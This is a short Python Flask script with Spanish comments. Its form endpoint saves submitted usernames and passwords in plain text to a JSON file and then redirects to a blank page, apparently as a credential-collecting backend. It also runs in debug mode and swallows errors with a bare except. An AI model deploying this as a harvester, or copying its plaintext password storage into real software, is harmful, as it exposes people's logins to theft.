from flask import Flask, request, redirect
import json
import os

app = Flask(__name__)

@app.route('/guardar', methods=['POST'])
def guardar():
    usuario = request.form['usuario']
    password = request.form['password']

    datos = {"usuario": usuario, "password": password}

    # Si ya existe el archivo, lo abrimos y agregamos
    if os.path.exists("datos.json"):
        with open("datos.json", "r", encoding="utf-8") as f:
            try:
                contenido = json.load(f)
            except:
                contenido = []
    else:
        contenido = []

    contenido.append(datos)

    # Guardar en JSON
    with open("datos.json", "w", encoding="utf-8") as f:
        json.dump(contenido, f, indent=4, ensure_ascii=False)

    # Redirigir a una página en blanco después de guardar
    return redirect("/pagina-blanca")

@app.route('/pagina-blanca')
def pagina_blanca():
    return "<html><body></body></html>"  # Página vacía


if __name__ == '__main__':
    app.run(debug=True)
